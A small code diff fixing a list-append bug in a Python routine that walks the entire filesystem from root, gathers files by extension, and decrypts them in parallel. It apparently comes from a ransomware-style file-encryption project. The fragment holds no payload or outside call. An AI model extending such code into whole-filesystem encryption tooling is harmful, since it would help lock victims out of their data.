@@ -49,7 +49,7 @@ def select_files():
     for root, dirs, files in os.walk("/"):
         for file in files:
             if file.endswith(str(ext)):
-                files_to_dec.push(os.path.join(root, file))
+                files_to_dec.append(os.path.join(root, file))
     
     # Parralelize execution of decrypting function over four sub processes 
     pool = Pool(processes=4)
